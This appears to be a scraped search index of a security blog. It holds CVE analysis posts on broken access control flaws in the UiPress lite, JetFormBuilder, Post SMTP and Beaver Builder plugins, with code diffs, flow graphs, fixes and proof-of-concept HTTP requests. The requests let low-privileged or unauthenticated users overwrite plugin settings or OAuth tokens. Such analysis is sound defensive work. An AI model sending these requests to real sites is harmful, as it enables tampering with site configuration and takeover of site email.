","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Log in using a Subscriber account Extract the nonce from the admin Dashboard Send the request: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: subcriber+_cookie action=uip_save_site_option\u0026security=e032057458\u0026option={payload}\u0026optionName=remote-sync --- Before mysql\u003e select * from wp_options where option_name='uip-global-settings'; +-----------+---------------------+------------------------------------------------------------------------------+----------+ | option_id | option_name | option_value | autoload | +-----------+---------------------+------------------------------------------------------------------------------+----------+ | 363 | uip-global-settings | a:1:{s:11:\"remote-sync\";a:1:{s:3:\"key\";s:27:\"uip-692c7c8dd99844.95568294\";}} | auto | +-----------+---------------------+------------------------------------------------------------------------------+----------+ 1 row in set (0.00 sec) -- After mysql\u003e select * from wp_options where option_name='uip-global-settings'; +-----------+---------------------+----------------------------------------------+----------+ | option_id | option_name | option_value | autoload | +-----------+---------------------+----------------------------------------------+----------+ | 363 | uip-global-settings | a:1:{s:11:\"remote-sync\";O:8:\"stdClass\":0:{}} | auto | +-----------+---------------------+----------------------------------------------+----------+ 1 row in set (0.00 sec) Error Occurred: An error occurred while changing options ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in UiPress lite \u003c= 3.5.08 originates from missing capability checks in AJAX callbacks for authenticated users, particularly the uip_save_site_option() function. Although the plugin uses a nonce for CSRF protection, this nonce is provided to all users, including Subscribers. This enables any low-privileged account to directly invoke privileged AJAX actions and overwrite important plugin settings stored in uip-global-settings. This is a Broken Access Control flaw allowing low-privilege users to modify admin-only data. The 3.5.09 patch fixes the issue by adding a current_user_can('manage_options') capability check. ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways A CSRF nonce alone is not secure without a capability check on the action performed. All privileged AJAX actions must validate capability before processing data. Nonces visible to all users can lead to abuse when combined with missing capability checks. Low-privileged accounts must never be allowed to modify admin settings, whether via AJAX or any other mechanisms. Nonce + capability check must always be paired to prevent CSRF and privilege escalation issues. ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress UiPress lite Plugin \u003c= 3.5.08 is vulnerable to Broken Access Control ","date":"2025-12-10","objectID":"/posts/2025-12-10-cve-2025-11815/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11815 Analysis \u0026 POC","uri":"/posts/2025-12-10-cve-2025-11815/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress JetFormBuilder Plugin.","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Missing Authorization vulnerability in jetmonsters JetFormBuilder (jetformbuilder) allows exploitation via Incorrectly Configured Access Control Security Levels. This issue affects JetFormBuilder from n/a to \u003c= 3.5.3. CVE ID: CVE-2025-64384 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 3.5.3 Patched Versions: 3.5.4 CVSS severity: Low (5.3) Required Privilege: Contributor Product: WordPress JetFormBuilder Plugin ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – JetFormBuilder: 3.5.3 – vulnerable 3.5.4 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis Perform code diff: Difference between the vulnerable and patched versions Vulnerable version (v3.5.3): The Generate_Form_Endpoint class contains functions that return the corresponding values used to register the REST API in WordPress: route: /ai/generate method: POST callback: run_callback used to generate forms with AI, with a limit of (15 requests / month) Form generation with AI This is the function used to register a new endpoint for the REST API. The basic structure is as follows: register_rest_route( string $namespace, string $route, array $args = array(), bool $override = false ); $namespace: Namespace for the route, usually the name of the plugin or module. Example: \"myplugin/v1\" $route: The endpoint path (after the namespace). Example: \"/items\" $args: Configuration array for the route, including: methods: HTTP methods (GET, POST, PUT, DELETE…). callback: Function executed when the endpoint is called. permission_callback: Function to check access permissions. args: (optional) Parameters passed to the endpoint. $override: Default is false. If true, it will override an existing route. By examining the functions in the Generate_Form_Endpoint class, we can see that if the API is registered, it lacks the permission_callback component to check access permissions. This allows all users (including unauthenticated users) to call this endpoint and freely use the AI form generation feature. Patched version (v3.5.4): class Generate_Form_Endpoint extends Rest_Api_Private_Endpoint_Base It indirectly extends Rest_Api_Endpoint_Base through Rest_Api_Private_Endpoint_Base: abstract class Rest_Api_Private_Endpoint_Base extends Rest_Api_Endpoint_Base { public function check_permission(): bool { return current_user_can( 'edit_jet_fb_forms' ); // admin only } } check_permission is created to override the check_permission method of Rest_Api_Endpoint_Base, ensuring that it is restricted to admin users. abstract class Rest_Api_Endpoint_Base implements Rest_Fetch_Endpoint { public function check_permission(): bool { return true; // permission_callback: true } ... } The plugin registered an action hook: add_action( 'rest_api_init', array( $this, 'register_routes' ) ); rest_api_init: This hook is triggered when WordPress initializes the REST API, at which point the register_routes callback is executed: public function register_routes() { foreach ( $this-\u003eroutes() as $route ) { $endpoint_args = $route-\u003eget_overridden_args() ?: array( 'methods' =\u003e $route::get_methods(), 'callback' =\u003e array( $route, 'run_callback' ), 'permission_callback' =\u003e array( $route, 'check_permission' ), 'args' =\u003e $route-\u003eget_common_args(), ); $result = register_rest_route( $route::get_namespace(), // jet-form-builder/v1/ \"/{$route::get_rest_base()}\", $endpoint_args, $route-\u003eget_override() ); if ( ! $result ) { _doing_it_wrong( __METHOD__, \"Error on register REST API route: {$route::get_namespace()}/{$route::get_rest_base()}\", '1.4.0' ); } } } The register_routes function iterates through each route and calls register_rest_route to register the API. $this-\u003eroutes() contains the routes registered in two ways: By extending Rest_Api_Controller_Base: class Controller extends Rest_Api_Controller_Base { protected $routes = array(); public function __construct() { $this-\u003eroutes = array( new Get_Form_Fields(), new Install_Migrations_Endpoint(), ); } public function routes(): array { return $this-\u003eroutes; } } By calling: $rest_api-\u003eget_controller()-\u003einstall( new Generate_Form_Endpoint() ); ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Attacker (Unauthenticated user)\"] --\u003e B[\"Send POST request to /wp-json/jet-form-builder/v1/ai/generate\"] --\u003e C[\"WordPress REST API receives request\"] --\u003e D[\"JetFormBuilder register_routes() is triggered via rest_api_init\"] --\u003e E[\"Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)\"] --\u003e F{\"Is permission_callback properly defined?\"} F -- No (\u003c=3.5.3) --\u003e G[\"Access granted to all users\"] G --\u003e H[\"run_callback executed → AI form generation\"] H --\u003e I[\"Attacker bypasses intended restriction (15 requests/month)\"] F -- Yes (\u003e=3.5.4) --\u003e J[\"check_permission() requires current_user_can('edit_jet_fb_forms')\"] J --\u003e K[\"Only Admin can access → Exploit prevented\"] graph TD A[\"Attacker (Unauthenticated user)\"] --\u003e B[\"Send POST request to /wp-json/jet-form-builder/v1/ai/generate\"] --\u003e C[\"WordPress REST API receives request\"] --\u003e D[\"JetFormBuilder register_routes() is triggered via rest_api_init\"] --\u003e E[\"Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)\"] --\u003e F{\"Is permission_callback properly defined?\"} F -- No (\u003c=3.5.3) --\u003e G[\"Access granted to all users\"] G --\u003e H[\"run_callback executed → AI form generation\"] H --\u003e I[\"Attacker bypasses intended restriction (15 requests/month)\"] F -- Yes (\u003e=3.5.4) --\u003e J[\"check_permission() requires current_user_can('edit_jet_fb_forms')\"] J --\u003e K[\"Only Admin can access → Exploit prevented\"] graph TD A[\"Attacker (Unauthenticated user)\"] --\u003e B[\"Send POST request to /wp-json/jet-form-builder/v1/ai/generate\"] --\u003e C[\"WordPress REST API receives request\"] --\u003e D[\"JetFormBuilder register_routes() is triggered via rest_api_init\"] --\u003e E[\"Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)\"] --\u003e F{\"Is permission_callback properly defined?\"} F -- No (\u003c=3.5.3) --\u003e G[\"Access granted to all users\"] G --\u003e H[\"run_callback executed → AI form generation\"] H --\u003e I[\"Attacker bypasses intended restriction (15 requests/month)\"] F -- Yes (\u003e=3.5.4) --\u003e J[\"check_permission() requires current_user_can('edit_jet_fb_forms')\"] J --\u003e K[\"Only Admin can access → Exploit prevented\"] graph TD A[\"Attacker (Unauthenticated user)\"] --\u003e B[\"Send POST request to /wp-json/jet-form-builder/v1/ai/generate\"] --\u003e C[\"WordPress REST API receives request\"] --\u003e D[\"JetFormBuilder register_routes() is triggered via rest_api_init\"] --\u003e E[\"Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)\"] --\u003e F{\"Is permission_callback properly defined?\"} F -- No (\u003c=3.5.3) --\u003e G[\"Access granted to all users\"] G --\u003e H[\"run_callback executed → AI form generation\"] H --\u003e I[\"Attacker bypasses intended restriction (15 requests/month)\"] F -- Yes (\u003e=3.5.4) --\u003e J[\"check_permission() requires current_user_can('edit_jet_fb_forms')\"] J --\u003e K[\"Only Admin can access → Exploit prevented\"] ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request as an unauthenticated user: POST /wp-json/jet-form-builder/v1/ai/generate HTTP/1.1 Host: localhost ... prompt=create malicious form submit Result ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-64384 stems from the missing permission_callback for the /ai/generate REST API in JetFormBuilder \u003c= 3.5.3, allowing unauthenticated users to access the endpoint and abuse the AI-powered form generation feature. Version 3.5.4 fixed this by enforcing a permission check using current_user_can('edit_jet_fb_forms'), restricting access to administrators only and fully eliminating the exploit possibility. ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Always define a permission_callback when registering REST API routes. Never rely on logical limits without proper access control. Inheriting the correct base class can prevent serious security flaws. ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress JetFormBuilder Plugin \u003c= 3.5.3 is vulnerable to Broken Access Control ","date":"2025-12-09","objectID":"/posts/2025-12-09-cve-2025-64384/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-64384 Analysis \u0026 POC","uri":"/posts/2025-12-09-cve-2025-64384/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Post SMTP Plugin.","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Post SMTP plugin for WordPress is vulnerable to authorization bypass in all versions up to and including 3.6.1. The issue arises because the plugin does not properly verify whether a user is allowed to update the OAuth token in the handle_gmail_oauth_redirect function. This allows an authenticated attacker, with access as low as a subscriber role or higher, to inject invalid or attacker-controlled OAuth credentials. CVE ID: CVE-2025-12887 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 3.6.1 Patched Versions: 3.6.2 CVSS Severity: Low (5.4) Required Privilege: Contributor Product: WordPress Post SMTP Plugin ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Post SMTP 3.6.1 – vulnerable 3.6.2 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an action hook: NewWizard.php v3.6.1 add_action( 'admin_init', array( $this, 'handle_gmail_oauth_redirect' ) ); admin_init Hook This is a WordPress hook that is triggered every time a logged-in user accesses the admin area. It runs early in the admin page initialization process, before any content is displayed. Action registration The Post SMTP plugin registers the handle_gmail_oauth_redirect function to the admin_init hook. This means any logged-in user (even a low-privileged user such as a subscriber) can trigger this function simply by accessing an admin page. In the vulnerable version (v3.6.1): NewWizard.php v3.6.1 public function handle_gmail_oauth_redirect() { // Check if the required OAuth parameters are present in the URL. if ( isset( $_GET['action'] ) \u0026\u0026 $_GET['action'] === 'gmail_oauth_redirect' ) { // Sanitize and retrieve URL parameters $access_token = isset( $_GET['access_token'] ) ? sanitize_text_field( $_GET['access_token'] ) : null; $refresh_token = isset( $_GET['refresh_token'] ) ? sanitize_text_field( $_GET['refresh_token'] ) : null; $expires_in = isset( $_GET['expires_in'] ) ? intval( $_GET['expires_in'] ) : 0; $msg = isset( $_GET['msg'] ) ? sanitize_text_field( $_GET['msg'] ) : ''; $user_email = isset( $_GET['user_email'] ) ? sanitize_email( $_GET['user_email'] ) : ''; $auth_token_expires = time() + $expires_in; if ( $access_token ) { $oauth_data = array( 'access_token' =\u003e $access_token, 'refresh_token' =\u003e $refresh_token, 'auth_token_expires'=\u003e $auth_token_expires, 'vendor_name' =\u003e 'google', 'user_email' =\u003e $user_email, ); // Save the OAuth parameters to the WordPress options table. update_option( 'postman_auth_token', $oauth_data ); } } } The logic of handle_gmail_oauth_redirect shows how the Post SMTP plugin processes OAuth tokens from Gmail. However, there are critical weaknesses: A logged-in user only needs to access an admin page with the parameters action=gmail_oauth_redirect and access_token in the URL to trigger the update logic. There is no capability check to ensure that only administrators are allowed to perform this action. Patched version (v3.6.2): NewWizard.php v3.6.2 public function handle_gmail_oauth_redirect() { // Check if the required OAuth parameters are present in the URL. if ( isset( $_GET['action'] ) \u0026\u0026 $_GET['action'] === 'gmail_oauth_redirect' ) { // Capability check: Only allow administrators to update OAuth tokens if ( ! current_user_can( 'manage_options' ) ) { wp_die( esc_html__( 'You do not have sufficient permissions to access this page.', 'post-smtp' ) ); } // CSRF protection: Verify nonce (required by security report) if ( ! isset( $_GET['_wpnonce'] ) || empty( $_GET['_wpnonce'] ) ) { wp_die( esc_html__( 'Security check failed. Nonce is missing.', 'post-smtp' ) ); } // Verify the nonce $nonce = sanitize_text_field( $_GET['_wpnonce'] ); if ( ! wp_verify_nonce( $nonce, 'gmail_oauth_redirect' ) ) { wp_die( esc_html__( 'Security check failed. Invalid nonce. Please try again.', 'post-smtp' ) ); } // Sanitize and retrieve URL parameters $access_token = isset( $_GET['access_token'] ) ? sanitize_text_field( $_GET['access_token'] ) : null; $refresh_token = isset( $_GET['refresh_token'] ) ? sanitize_text_field( $_GET['refresh_token'] ) : null; $expires_in = isset( $_GET['expires_in'] ) ? intval( $_GET['expires_in'] ) : 0; $msg = isset( $_GET['msg'] ) ? sanitize_text_field( $_GET['msg'] ) : ''; $user_email = isset( $_GET['user_email'] ) ? sanitize_email( $_GET['user_email'] ) : ''; $auth_token_expires = time() + $expires_in; if ( $access_token ) { $oauth_data = array( 'access_token' =\u003e $access_token, 'refresh_token' =\u003e $refresh_token, 'auth_token_expires'=\u003e $auth_token_expires, 'vendor_name' =\u003e 'google', 'user_email' =\u003e $user_email, ); // Save the OAuth parameters to the WordPress options table. update_option( 'postman_auth_token', $oauth_data ); } } } The patch introduces: Capability check Only administrators (users with the manage_options capability) are ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Access admin area: /wp-admin/\"] --\u003e C[\"admin_init hook is triggered\"] --\u003e D[\"Post SMTP: handle_gmail_oauth_redirect() is executed\"] --\u003e E{\"Is GET[action] = gmail_oauth_redirect ?\"} E -- No --\u003e F[\"Function exits – No impact\"] E -- Yes --\u003e G[\"Read parameters from URL: access_token, refresh_token, expires_in, user_email\"] --\u003e H{\"Is access_token present ?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Build OAuth data array\"] --\u003e J[\"update_option('postman_auth_token', oauth_data)\"] --\u003e K[\"OAuth token is overwritten by attacker-controlled data\"] graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Access admin area: /wp-admin/\"] --\u003e C[\"admin_init hook is triggered\"] --\u003e D[\"Post SMTP: handle_gmail_oauth_redirect() is executed\"] --\u003e E{\"Is GET[action] = gmail_oauth_redirect ?\"} E -- No --\u003e F[\"Function exits – No impact\"] E -- Yes --\u003e G[\"Read parameters from URL: access_token, refresh_token, expires_in, user_email\"] --\u003e H{\"Is access_token present ?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Build OAuth data array\"] --\u003e J[\"update_option('postman_auth_token', oauth_data)\"] --\u003e K[\"OAuth token is overwritten by attacker-controlled data\"] graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Access admin area: /wp-admin/\"] --\u003e C[\"admin_init hook is triggered\"] --\u003e D[\"Post SMTP: handle_gmail_oauth_redirect() is executed\"] --\u003e E{\"Is GET[action] = gmail_oauth_redirect ?\"} E -- No --\u003e F[\"Function exits – No impact\"] E -- Yes --\u003e G[\"Read parameters from URL: access_token, refresh_token, expires_in, user_email\"] --\u003e H{\"Is access_token present ?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Build OAuth data array\"] --\u003e J[\"update_option('postman_auth_token', oauth_data)\"] --\u003e K[\"OAuth token is overwritten by attacker-controlled data\"] graph TD A[\"Authenticated user (Subscriber or higher)\"] --\u003e B[\"Access admin area: /wp-admin/\"] --\u003e C[\"admin_init hook is triggered\"] --\u003e D[\"Post SMTP: handle_gmail_oauth_redirect() is executed\"] --\u003e E{\"Is GET[action] = gmail_oauth_redirect ?\"} E -- No --\u003e F[\"Function exits – No impact\"] E -- Yes --\u003e G[\"Read parameters from URL: access_token, refresh_token, expires_in, user_email\"] --\u003e H{\"Is access_token present ?\"} H -- No --\u003e F H -- Yes --\u003e I[\"Build OAuth data array\"] --\u003e J[\"update_option('postman_auth_token', oauth_data)\"] --\u003e K[\"OAuth token is overwritten by attacker-controlled data\"] ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send the following request while authenticated as a Subscriber+ user: GET /wp-admin/?action=gmail_oauth_redirect\u0026access_token=access_token_payload\u0026refresh_token=refresh_to_payload\u0026expires_in=expires_in_payload\u0026user_email=user_email@gmail.com HTTP/1.1 Host: localhost Cookie: subscriber+ cookie ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-12887 vulnerability stems from the Post SMTP plugin directly binding the handle_gmail_oauth_redirect function to the admin_init hook without performing any capability checks or additional authentication mechanisms. This allows any authenticated user, even with low privileges such as Subscriber/Contributor, to send arbitrary requests that overwrite the postman_auth_token value in the WordPress options table. The absence of a capability check and nonce verification created a critical weakness in the OAuth handling workflow, potentially allowing attackers to take control over the site’s email sending configuration. This issue was resolved in version 3.6.2 by restricting execution to administrators and introducing nonce validation to prevent forged requests. ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:6:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never attach sensitive actions (such as token updates) to general hooks like admin_init without validating user privileges. Always use current_user_can() to ensure that only appropriate roles can perform high-risk actions. Enforce nonce verification for any state-changing request to protect against CSRF. Do not trust data coming from $_GET or $_POST without proper authentication and authorization controls. Updating OAuth tokens should be treated as an administrative action and protected as strictly as other critical system changes. ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:7:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Broken Access Control WordPress Post SMTP Plugin \u003c= 3.6.1 is vulnerable to Broken Access Control ","date":"2025-12-08","objectID":"/posts/2025-12-08-cve-2025-12887/:8:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-12887 Analysis \u0026 POC","uri":"/posts/2025-12-08-cve-2025-12887/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Beaver Builder Plugin.","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Beaver Builder – WordPress Page Builder plugin for WordPress contains a Missing Authorization vulnerability in all versions up to and including 2.9.4. The root cause is insufficient capability checks in the REST API endpoints under the namespace fl-controls/v1, which manage Global Presets across the entire website. This allows authenticated attackers with at least Contributor privileges to add, modify, or delete global color presets and background presets, affecting all content built with Beaver Builder site-wide. CVE ID: CVE-2025-11726 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 2.9.4 Patched Versions: 2.9.4.1 CVSS severity: Low (5.4) Required Privilege: Contributor Product: WordPress Beaver Builder Plugin ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Beaver Builder: 2.9.4 – vulnerable 2.9.4.1 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis In the vulnerable version (v2.9.4): class-fl-controls.php v2.9.4 static public function register_rest_endpoints() { ... register_rest_route( 'fl-controls/v1', '/color_presets/', array( 'methods' =\u003e WP_REST_Server::CREATABLE, 'callback' =\u003e __CLASS__ . '::set_color_presets', 'permission_callback' =\u003e __CLASS__ . '::check_permission', ) ); register_rest_route( 'fl-controls/v1', '/color_presets/', array( 'methods' =\u003e WP_REST_Server::DELETABLE, 'callback' =\u003e __CLASS__ . '::delete_color_presets', 'permission_callback' =\u003e __CLASS__ . '::check_permission', ) ); register_rest_route( 'fl-controls/v1', '/background_presets/', array( 'methods' =\u003e WP_REST_Server::CREATABLE, 'callback' =\u003e __CLASS__ . '::set_background_presets', 'permission_callback' =\u003e __CLASS__ . '::check_permission', ) ); ... } The plugin registers REST API endpoints under the namespace fl-controls/v1, which can add, modify, or delete global color presets and background presets. These APIs control access via the callback check_permission: class-fl-controls.php v2.9.4 static public function check_permission() { return FLBuilderUserAccess::current_user_can( 'builder_access' ); } The plugin customizes a current_user_can function and checks the builder_access permission: class-fl-controls.php v2.9.4 public static function register_default_settings() { self::register_setting( 'builder_access', array( 'default' =\u003e 'all', 'group' =\u003e __( 'Frontend', 'fl-builder' ), 'label' =\u003e __( 'Builder Access', 'fl-builder' ), 'description' =\u003e __( 'The selected roles will have access to the builder for editing posts, pages, and CPTs.', 'fl-builder' ), 'order' =\u003e '1', ) ); self::register_setting( 'unrestricted_editing', array( 'default' =\u003e 'all', 'group' =\u003e __( 'Frontend', 'fl-builder' ), 'label' =\u003e __( 'Unrestricted Editing', 'fl-builder' ), 'description' =\u003e __( 'The selected roles will have unrestricted access to all editing features within the builder.', 'fl-builder' ), 'order' =\u003e '2', ) ); } builder_access is registered with 'default' =\u003e 'all', meaning it applies to all users. Question If builder_access applies to all users, why is the vulnerability reported for Contributor privileges? The answer lies in the logic of the plugin’s current_user_can function: class-fl-builder-user-access.php v2.9.4 static public function current_user_can( $key ) { $user = wp_get_current_user(); $settings = self::get_saved_settings(); // Return false if no settings saved. if ( ! isset( $settings[ $key ] ) ) { return false; } // Make sure super admins have administrator access. if ( is_multisite() \u0026\u0026 is_super_admin() \u0026\u0026 ! in_array( 'administrator', $user-\u003eroles ) ) { $user-\u003eroles[] = 'administrator'; } // Check the user's roles against the saved settings. foreach ( $user-\u003eroles as $role ) { // Return true if the user has access. if ( isset( $settings[ $key ][ $role ] ) \u0026\u0026 $settings[ $key ][ $role ] ) { return true; } } return false; } current_user_can checks permissions based on role + plugin settings, not WordPress’s standard capabilities. It calls self::get_saved_settings() to fetch settings: class-fl-builder-user-access.php v2.9.4 static public function get_saved_settings() { if ( self::$settings ) { return self::$settings; } $roles = self::get_all_roles(); $settings = FLBuilderModel::get_admin_settings_option( '_fl_builder_user_access', true ); $ms_settings = FLBuilderModel::get_admin_settings_option( '_fl_builder_user_access', false ); $ms_support = FLBuilderAdminSettings::multisite_support(); if ( ! is_array( $settings ) ) { $settings = array(); } foreach ( self::$registered_settings as $key =\u003e $data ) { if ( ! isset( $settings[ $key ] ) ) { if ( $ms_support \u0026\u0026 isset( $ms_settings[ $key ] ) ) { $settings[ $key ] = $ms_settings[ $key ]; } else { $settings[ $key ] = array(); } } foreach ( $roles as $role_key =\u003e $role_data ) { if ( ! isset( $settings[ $key ][ $role_key ] ) ) { if ( ! isset( $data['default'] ) || ! $data['default'] ) { $settings[ $key ][ $role_key ] = false; } elseif ( is_array( $data[","date":"2025-12-07","objectID":"/posts/2025-12-07-cve-2025-11726/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-11726 Analysis \u0026 POC","uri":"/posts/2025-12-07-cve-2025-11726/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Authenticated user (Contributor or higher)\"] --\u003e B[\"Sends request to /wp-json/fl-controls/v1/*\"] --\u003e C[\"REST API calls permission_callback = check_permission()\"] --\u003e D[\"check_permission() → current_user_can('builder_access')\"] --\u003e G[\"builder_access = true for Contributor\"] --\u003e H[\"Request is accepted\"] --\u003e I[\"set_color_presets / delete_color_presets / set_background_presets\"] --\u003e J[\"Global Presets are added / modified / deleted site-wide\"] graph TD A[\"Authenticated user (Contributor or higher)\"] --\u003e B[\"Sends request to /wp-json/fl-controls/v1/*\"] --\u003e C[\"REST API calls permission_callback = check_permission()\"] --\u003e D[\"check_permission() → current_user_can('builder_access')\"] --\u003e G[\"builder_access = true for Contributor\"] --\u003e H[\"Request is accepted\"] --\u003e I[\"set_color_presets / delete_color_presets / set_background_presets\"] --\u003e J[\"Global Presets are added / modified / deleted site-wide\"] graph TD A[\"Authenticated user (Contributor or higher)\"] --\u003e B[\"Sends request to /wp-json/fl-controls/v1/*\"] --\u003e 